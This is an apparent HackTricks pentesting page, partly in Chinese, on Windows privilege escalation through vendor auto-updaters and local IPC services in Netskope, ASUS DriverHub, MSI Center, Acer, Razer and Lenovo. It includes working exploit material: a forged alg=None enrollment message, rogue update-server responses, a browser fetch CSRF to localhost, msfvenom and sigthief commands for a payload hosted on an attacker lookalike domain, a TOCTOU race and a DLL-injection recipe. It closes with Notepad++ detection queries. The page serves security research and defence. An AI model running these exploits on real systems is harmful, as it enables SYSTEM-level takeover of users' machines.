# 滥用 Enterprise Auto-Updaters 和 Privileged IPC（例如，Netskope、ASUS 与 MSI）

{{#include ../../banners/hacktricks-training.md}}

本页概括了一类在 enterprise endpoint agents 和 updaters 中发现的 Windows local privilege escalation 链，这类组件暴露了低摩擦的 IPC 面和 privileged update flow。一个代表性例子是 Windows 版 Netskope Client < R129（CVE-2025-0309），其中低权限用户可以强制重新 enrollment 到攻击者控制的服务器，然后投递一个恶意 MSI，由 SYSTEM service 安装。

可在类似产品中复用的关键思路：
- 滥用 privileged service 的 localhost IPC，强制重新 enrollment 或 reconfiguration 到攻击者服务器。
- 实现 vendor 的 update endpoints，投递 rogue Trusted Root CA，并让 updater 指向一个恶意的、“signed” package。
- 绕过弱 signer checks（CN allow-lists）、可选 digest flags，以及宽松的 MSI properties。
- 如果 IPC 是“encrypted”的，从 registry 中可世界可读的 machine identifiers 派生 key/IV。
- 如果 service 按 image path/process name 限制调用者，则注入到 allow-listed process，或者以 suspended 方式启动一个进程，并通过一个最小化的 thread-context patch 启动你的 DLL。

---
## 1) 通过 localhost IPC 强制 enrollment 到攻击者服务器

许多 agents 都带有一个 user-mode UI process，通过 localhost TCP 使用 JSON 与 SYSTEM service 通信。

在 Netskope 中观察到：
- UI: stAgentUI（low integrity）↔ Service: stAgentSvc（SYSTEM）
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

利用流程：
1) 构造一个 JWT enrollment token，使其 claims 控制 backend host（例如 AddonUrl）。使用 alg=None，这样就不需要签名。
2) 发送调用 provisioning command 的 IPC message，带上你的 JWT 和 tenant name：
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) The service starts hitting your rogue server for enrollment/config, e.g.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- If caller verification is path/name-based, originate the request from an allow-listed vendor binary (see §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Once the client talks to your server, implement the expected endpoints and steer it to an attacker MSI. Typical sequence:

1) /v2/config/org/clientconfig → Return JSON config with a very short updater interval, e.g.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Return a PEM CA certificate. The service installs it into the Local Machine Trusted Root store.
3) /v2/checkupdate → Supply metadata pointing to a malicious MSI and a fake version.

Bypassing common checks seen in the wild:
- Signer CN allow-list: the service may only check the Subject CN equals “netSkope Inc” or “Netskope, Inc.”. Your rogue CA can issue a leaf with that CN and sign the MSI.
- CERT_DIGEST property: include a benign MSI property named CERT_DIGEST. No enforcement at install.
- Optional digest enforcement: config flag (e.g., check_msi_digest=false) disables extra cryptographic validation.

Result: The SYSTEM service installs your MSI from
C:\ProgramData\Netskope\stAgent\data\*.msi
executing arbitrary code as NT AUTHORITY\SYSTEM.

Patch-bypass lesson: if a vendor responds by allow-listing a small set of “trusted” domains instead of cryptographically authenticating the update source, look for vendor-owned redirectors or reverse proxies that still let you steer traffic. In Netskope's case, public follow-up research showed that an R129-era allow-list could still be abused through `rproxy.goskope.com`, which proxied attacker-controlled Azure App Service content. Treat hostname allow-lists as a speed bump, not as a trust boundary.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers can reproduce encryption and send valid encrypted commands from a standard user. General tip: if an agent suddenly “encrypts” its IPC, look for device IDs, product GUIDs, install IDs under HKLM as material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Some services try to authenticate the peer by resolving the TCP connection’s PID and comparing the image path/name against allow-listed vendor binaries located under Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Two practical bypasses:
- DLL injection into an allow-listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
- Spawn an allow-listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver-enforced tamper rules.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

A reliable user-mode loader that respects these constraints:
1) CreateProcess of a vendor binary with CREATE_SUSPENDED.
2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).
3) Overwrite ntdll!NtContinue (or other early, guaranteed-mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.
4) ResumeThread to trigger your stub in-process, loading your DLL.

Because you never used PROCESS_CREATE_THREAD or PROCESS_SUSPEND_RESUME on an already-protected process (you created it), the driver’s policy is satisfied.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automates a rogue CA, malicious MSI signing, and serves the needed endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is a custom IPC client that crafts arbitrary (optionally AES-encrypted) IPC messages and includes the suspended-process injection to originate from an allow-listed binary.

## 7) Fast triage workflow for unknown updater/IPC surfaces

When facing a new endpoint agent or motherboard “helper” suite, a quick workflow is usually enough to tell whether you are looking at a promising privesc target:

1) Enumerate loopback listeners and map them back to vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) 枚举候选 named pipes：
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) 挖掘由基于插件的 IPC servers 使用的 registry-backed routing data：
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) 先从 user-mode client 中提取 endpoint names、JSON keys 和 command IDs。Packed Electron/.NET frontends 常常会泄露完整的 schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) 不要只盯着最终会启动进程的代码路径，要去寻找真正的 trust predicate：
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patterns worth prioritizing:
- `CryptQueryObject`/certificate parsing without `WinVerifyTrust` usually means “certificate exists” was treated as “certificate is trusted”, enabling certificate cloning or other fake-signer tricks.
- Substring/suffix checks over `Origin`, `Referer`, download URLs, process names, or signer CNs are not authentication. `contains(".vendor.com")` is usually exploitable with attacker-controlled lookalike domains.
- If the low-privileged GUI decides “the file is trusted” and the SYSTEM broker merely consumes that result, patching or reimplementing the client-side DLL/JS often bypasses the boundary entirely (Razer-style split validation).
- If the broker copies a payload to `%TEMP%`/`C:\Windows\Temp` and then validates or schedules it from that path, immediately test for TOCTOU replacement windows and for sibling plugin modules that expose alternate `ExecuteTask()` wrappers with weaker checks.

For named-pipe-heavy targets, PipeViewer is a quick way to spot weak DACLs and remotely reachable pipes before you start reversing the protocol in depth.

If the target authenticates callers only by PID, image path, or process name, treat that as a speed bump rather than a boundary: injecting into the legitimate client, or making the connection from an allow-listed process, is often enough to satisfy the server’s checks. For named pipes specifically, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) covers the primitive in more depth.

---
## 8) Modular add-in brokers authenticated only by vendor signatures (Lenovo Vantage pattern)

A newer variation worth hunting is the **signed-client RPC broker**: a low-privileged Lenovo-signed desktop process talks to a SYSTEM service, and the service routes JSON commands into a set of XML-described add-ins under `%ProgramData%`. Once code execution is achieved **inside any accepted signed client**, every `runas="system"` contract becomes part of your attack surface.

High-value primitives observed in Lenovo Vantage research:
- **Trusting the caller because it is signed by the vendor**: researchers reached an authenticated context by copying a Lenovo-signed EXE to a writable directory and satisfying a DLL side-load (`profapi.dll`) so arbitrary code ran inside a client the service already trusted.
- **Manifest-driven attack surface discovery**: add-ins are declared under `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; several contracts run as `SYSTEM`, so enumerating those manifests often reveals the real privileged verbs faster than reversing the broker itself.
- **Per-command bugs behind the authenticated channel**: once inside the trusted client, public research found path-traversal + race conditions in update/install verbs, raw-SQL abuse in privileged settings databases, and substring-based registry path checks that enabled writes outside the intended hive.

Useful recon on a target:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
实战要点：每当一个 helper suite 暴露出一个 broker，它先认证 **caller process**，然后才分发到几十个 plugin/add-in 命令时，不要在绕过前门信任检查后就停下。把 manifest/contract table dump 出来，并分别 fuzz 每个高权限 verb；经过认证的通道通常还隐藏着若干 second-stage bugs。

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub 提供了一个 user-mode HTTP service (ADU.exe)，运行在 127.0.0.1:53000，上面期望来自 https://driverhub.asus.com 的 browser 调用。origin filter 只是对 Origin header 和 `/asus/v1.0/*` 暴露的 download URLs 执行 `string_contains(".asus.com")`。因此，任何 attacker-controlled host，例如 `https://driverhub.asus.com.attacker.tld`，都会通过检查，并且可以从 JavaScript 发起 state-changing requests。关于更多绕过模式，参见 [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md)。

实战流程：
1) 注册一个嵌入 `.asus.com` 的 domain，并在其上托管一个 malicious webpage。
2) 使用 `fetch` 或 XHR 调用 `http://127.0.0.1:53000` 上的 privileged endpoint（例如 `Reboot`、`UpdateApp`）。
3) 发送 handler 期望的 JSON body——打包后的 frontend JS 展示了下面的 schema。
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
即使下面显示的 PowerShell CLI 在 Origin 头被 spoof 成受信任的值时也能成功：
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

To weaponize the flow:
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Because both the Origin and URL filters are substring-based and the signer check only compares strings, DriverHub pulls and executes the attacker binary under its elevated context.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker-controlled arguments.

The copied file is not locked between verification and `ExecuteTask()`. An attacker can:
- Send Frame A pointing to a legitimate MSI-signed binary (guarantees the signature check passes and the task is queued).
- Race it with repeated Frame B messages that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.

When the scheduler fires, it executes the overwritten payload under SYSTEM despite having validated the original file. Reliable exploitation uses two goroutines/threads that spam CMD_AutoUpdateSDK until the TOCTOU window is won.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. The first 4 bytes of a frame select that component, allowing attackers to route commands to arbitrary modules.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 added another useful pattern to this family: a low-privileged user can ask a COM helper to launch a process through `RzUtility.Elevator`, while the trust decision is delegated to a user-mode DLL (`simple_service.dll`) rather than being enforced robustly inside the privileged boundary.

Observed exploitation path:
- Instantiate the COM object `RzUtility.Elevator`.
- Call `LaunchProcessNoWait(<path>, "", 1)` to request an elevated launch.
- In the public PoC, the PE-signature gate inside `simple_service.dll` is patched out before issuing the request, allowing an arbitrary attacker-chosen executable to be launched.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
General takeaway: when reversing “helper” suites, do not stop at localhost TCP or named pipes. Check for COM classes with names such as `Elevator`, `Launcher`, `Updater`, or `Utility`, then verify whether the privileged service actually validates the target binary itself or merely trusts a result computed by a patchable user-mode client DLL. This pattern generalizes beyond Razer: any split design where the high-privilege broker consumes an allow/deny decision from the low-privilege side is a candidate privesc surface.

---
## 通过弱 updater 验证的远程 supply-chain hijack（WinGUp / Notepad++）

在 2025 年 6 月到 2025 年 12 月之间，攻破 Notepad++ update flow 背后托管基础设施的攻击者，选择性地向特定受害者提供恶意 manifest。较旧的基于 WinGUp 的 updaters 并未完全验证 update 的真实性，因此恶意 XML 响应可以把客户端重定向到攻击者控制的 URL。由于 client 接受 HTTPS content 时，没有强制同时满足受信任的证书链和下载的 installer 上有效的 PE signature，受害者便会下载并执行被 trojanized 的 NSIS `update.exe`。

Operational flow（不需要本地 exploit）：
1. **Infrastructure interception**：入侵 CDN/hosting，并用指向恶意下载 URL 的攻击者 metadata 回应 update checks。
2. **Trojanized NSIS**：installer 获取/执行 payload，并滥用两条执行链：
- **Bring-your-own signed binary + sideload**：捆绑已签名的 Bitdefender `BluetoothService.exe`，并在其搜索路径中投放恶意 `log.dll`。当已签名的 binary 运行时，Windows 会 sideload `log.dll`，该 DLL 解密并 reflectively load Chrysalis backdoor（使用 Warbird-protected + API hashing 以阻碍静态检测）。
- **Scripted shellcode injection**：NSIS 执行一个编译后的 Lua 脚本，使用 Win32 APIs（例如 `EnumWindowStationsW`）注入 shellcode 并 stage Cobalt Strike Beacon。

适用于任何 auto-updater 的加固/detection 要点：
- 强制对下载的 installer 进行 **certificate + signature verification**（pin vendor signer，拒绝不匹配的 CN/chain），并对 update manifest 本身签名（例如 XMLDSig）。除非已验证，否则阻止由 manifest 控制的重定向。
- 将 **BYO signed binary sideloading** 视为下载后的 detection pivot：当已签名的 vendor EXE 从其规范安装路径之外加载某个 DLL 名称时进行告警（例如 Bitdefender 从 Temp/Downloads 加载 `log.dll`），以及当 updater 从 temp 投放/执行带有非 vendor signature 的 installer 时进行告警。
- 监控该链条中观察到的 **malware-specific artifacts**（也可作为通用 pivot）：mutex `Global\Jdhfv_1.0.1`、异常的 `gup.exe` 向 `%TEMP%` 写入，以及 Lua 驱动的 shellcode injection stages。
- Notepad++ 在 v8.8.9 及之后版本加强了 WinGUp：返回的 XML 现在已签名（XMLDSig），并且更新的 build 会强制对下载的 installer 进行 certificate + signature verification，而不是仅信任传输本身。

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> launching a non-Notepad++ installer</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

这些模式可推广到任何接受未签名 manifests 或未固定 installer signer 的 updater——network hijack + malicious installer + BYO-signed sideloading 会在“trusted” updates 的掩护下导致 remote code execution。

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
